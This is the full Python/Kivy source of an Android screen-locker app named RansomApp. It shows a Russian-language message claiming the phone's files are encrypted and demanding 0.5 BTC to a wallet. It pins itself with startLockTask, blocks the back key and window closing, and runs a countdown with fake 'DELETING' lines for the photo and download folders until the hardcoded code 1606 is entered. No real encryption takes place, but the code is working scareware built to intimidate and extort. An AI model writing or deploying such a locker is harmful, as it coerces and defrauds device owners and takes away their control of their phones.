from kivy.app import App
from kivy.uix.floatlayout import FloatLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
from kivy.clock import Clock
from kivy.core.window import Window
from kivy.graphics import Color, Rectangle
from kivy.animation import Animation
from kivy.core.audio import SoundLoader
from kivy.utils import platform
import random, math, struct, io

# ============================================================
# НАСТРОЙКИ
# ============================================================
CORRECT_PASSWORD = "1606"
TITLE_TEXT = "ТЕЛЕФОН ЗАБЛОКИРОВАН"
MAIN_TEXT = "Все ваши файлы зашифрованы.\nОтправьте 0.5 BTC на кошелек:"
WALLET = "bc1qwes0m96sm0m6e29jn6sn8sh0n1s2h3j4k5"
TIMER_SECONDS = 300 

Window.clearcolor = (0.02, 0.02, 0.02, 1)
Window.fullscreen = True 

def vibrate(pattern=0.5):
    if platform == "android":
        try:
            from plyer import vibrator
            vibrator.vibrate(pattern)
        except: pass

# БЛОКИРОВКА ANDROID (Закрепление экрана)
def block_android_system():
    if platform != "android":
        return
    try:
        from jnius import autoclass
        PythonActivity = autoclass('org.kivy.android.PythonActivity')
        activity = PythonActivity.mActivity
        activity.startLockTask() # Закрепляет приложение
    except:
        pass

# ============================================================
# ЗВУКИ
# ============================================================
def make_wav(freq, duration, vol=0.3):
    sr = 44100
    n = int(sr * duration)
    samples = [int(math.sin(2 * math.pi * freq * i / sr) * vol * 32767) for i in range(n)]
    data = struct.pack("<" + "h" * n, *samples)
    return b"RIFF" + struct.pack("<I", 36 + len(data)) + b"WAVEfmt " + struct.pack("<IHHIIHH", 16, 1, 1, sr, sr*2, 2, 16) + b"data" + struct.pack("<I", len(data)) + data

def get_sound(freq, dur):
    try: return SoundLoader.load(io.BytesIO(make_wav(freq, dur)))
    except: return None

S_TICK, S_ERR, S_OK = None, None, None
def init_audio():
    global S_TICK, S_ERR, S_OK
    S_TICK = get_sound(880, 0.05)
    S_ERR = get_sound(180, 0.4)
    S_OK = get_sound(1200, 0.2)

def play(s):
    if s:
        try: s.stop(); s.play()
        except: pass

class RansomScreen(FloatLayout):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.sec = TIMER_SECONDS
        self.fails = 0
        self.is_rebooting = False

        with self.canvas.before:
            Color(0.05, 0, 0, 1)
            self.rect = Rectangle(pos=self.pos, size=self.size)
        self.bind(pos=self.upd_rect, size=self.upd_rect)

        self.title = Label(text=TITLE_TEXT, color=(1, 0.1, 0.1, 1), font_size="26sp", bold=True,
                           size_hint=(1, 0.1), pos_hint={"center_x": 0.5, "top": 0.95},
                           halign="center", valign="middle", text_size=(Window.width - 20, None))
        self.add_widget(self.title)

        self.add_widget(Label(text="[ X ]", color=(1, 1, 1, 1), font_size="80sp", bold=True,
                              size_hint=(1, 0.15), pos_hint={"center_x": 0.5, "top": 0.82}))

        self.add_widget(Label(text=MAIN_TEXT, color=(1, 1, 1, 1), font_size="18sp",
                              size_hint=(1, 0.15), pos_hint={"center_x": 0.5, "top": 0.65},
                              halign="center", valign="middle", text_size=(Window.width - 40, None)))

        self.add_widget(Label(text=WALLET, color=(1, 0.87, 0, 1), font_size="15sp",
                              size_hint=(1, 0.08), pos_hint={"center_x": 0.5, "top": 0.5},
                              halign="center", text_size=(Window.width - 20, None)))

        self.timer = Label(text="05:00", color=(1, 0.87, 0, 1), font_size="40sp", bold=True,
                           size_hint=(1, 0.1), pos_hint={"center_x": 0.5, "top": 0.4})
        self.add_widget(self.timer)

        self.scan = Label(text="", color=(0, 1, 0, 1), font_size="12sp",
                          size_hint=(1, 0.05), pos_hint={"center_x": 0.5, "top": 0.3},
                          halign="center", text_size=(Window.width - 20, None))
        self.add_widget(self.scan)

        self.pwd = TextInput(text="", password=True, multiline=False, font_size="24sp", halign="center",
                             size_hint=(0.6, 0.06), pos_hint={"center_x": 0.5, "top": 0.2},
                             background_color=(0.1, 0.1, 0.1, 1), foreground_color=(1, 1, 1, 1))
        self.pwd.bind(on_text_validate=self.check_pwd)
        self.add_widget(self.pwd)

        self.btn = Button(text="РАСШИФРОВАТЬ", background_color=(0.8, 0.1, 0.1, 1), background_normal="",
                          color=(1, 1, 1, 1), bold=True, font_size="18sp",
                          size_hint=(0.6, 0.06), pos_hint={"center_x": 0.5, "top": 0.1})
        self.btn.bind(on_press=self.check_pwd)
        self.add_widget(self.btn)

        self.status = Label(text="", color=(1, 0.3, 0.3, 1), font_size="16sp", bold=True,
                            size_hint=(1, 0.05), pos_hint={"center_x": 0.5, "y": 0.01})
        self.add_widget(self.status)

        anim = Animation(opacity=0.3, duration=0.5) + Animation(opacity=1, duration=0.5)
        anim.repeat = True
        anim.start(self.title)

        Clock.schedule_interval(self.tick, 1)
        Clock.schedule_interval(self.scan_loop, 0.1)
        Clock.schedule_once(lambda dt: init_audio(), 0.5)
        Clock.schedule_once(lambda dt: block_android_system(), 1.0) 
        
        self.scan_paths = ["/storage/emulated/0/DCIM/", "/storage/emulated/0/Download/"]
        self.scan_buf = ""

        Window.bind(on_request_close=self.block_close)
        Window.bind(on_keyboard=self.block_keys)

    def upd_rect(self, *args):
        self.rect.pos = self.pos
        self.rect.size = self.size

    def block_close(self, *args): return True
    def block_keys(self, w, k, *args): return True if k == 27 else False

    def tick(self, dt):
        if self.sec > 0:
            self.sec -= 1
            m, s = divmod(self.sec, 60)
            self.timer.text = f"{m:02d}:{s:02d}"
            play(S_TICK)
            if self.sec <= 10:
                self.timer.color = (1, 0.2, 0.2, 1)
        elif self.sec == 0 and not self.is_rebooting:
            self.is_rebooting = True
            self.timer.text = "00:00"
            self.status.text = "ВРЕМЯ ВЫШЛО! ФАЙЛЫ УДАЛЕНЫ."
            self.status.color = (1, 0, 0, 1)
            try:
                self.pwd.disabled = True
                self.btn.disabled = True
            except: pass
            Clock.schedule_once(self.finish_app, 3)

    def finish_app(self, dt):
        App.get_running_app().stop()

    def scan_loop(self, dt):
        if random.random() < 0.15: self.scan_buf = f"DELETING: {random.choice(self.scan_paths)}"
        elif self.scan_buf: self.scan_buf += " █"
        if len(self.scan_buf) > 35: self.scan_buf = self.scan_buf[-35:]
        self.scan.text = self.scan_buf

    def check_pwd(self, *args):
        if self.pwd.text.strip() == CORRECT_PASSWORD: self.success()
        else: self.fail()

    def fail(self):
        self.fails += 1
        play(S_ERR)
        vibrate(0.5)
        self.status.text = f"НЕВЕРНЫЙ КЛЮЧ ({self.fails})"
        self.pwd.text = ""

    def success(self):
        play(S_OK)
        self.status.text = "ДОСТУП ВОССТАНОВЛЕН"
        self.status.color = (0.2, 1, 0.4, 1)
        Window.unbind(on_request_close=self.block_close)
        Window.unbind(on_keyboard=self.block_keys)
        Clock.schedule_once(lambda dt: App.get_running_app().stop(), 0.8)

class RansomApp(App):
    def build(self): return RansomScreen()

if __name__ == "__main__":
    RansomApp().run()
